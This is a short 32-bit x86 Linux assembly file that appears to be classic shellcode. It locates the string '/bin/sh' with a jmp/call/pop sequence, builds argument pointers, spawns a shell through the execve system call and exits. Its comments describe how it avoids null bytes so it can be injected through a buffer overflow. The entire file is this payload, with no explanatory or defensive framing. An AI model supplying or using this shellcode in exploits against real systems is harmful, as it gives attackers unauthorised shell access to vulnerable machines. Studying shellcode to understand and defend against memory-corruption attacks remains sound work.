#include <sys/syscall.h>

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+4)

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  popl    %esi                    /* esi points to STRING */
  movl    %esi,(ARGV)(%esi)       /* set up argv pointer to pathname */
  xorl    %eax,%eax               /* get a 32-bit zero value */
  movb    %al,(STRLEN)(%esi)      /* null-terminate our string */
  movl    %eax,(ENVP)(%esi)       /* set up null envp */
  
  movb    $SYS_execve,%al         /* syscall number */
  movl    %esi,%ebx               /* arg 1: string pathname */
  leal    ARGV(%esi),%ecx         /* arg 2: argv */
  leal    ENVP(%esi),%edx         /* arg 3: envp */
  int     $0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], NULL) */
  
  xorl    %ebx,%ebx               /* arg 1: 0 */
  movl    %ebx,%eax
  inc     %eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int     $0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING
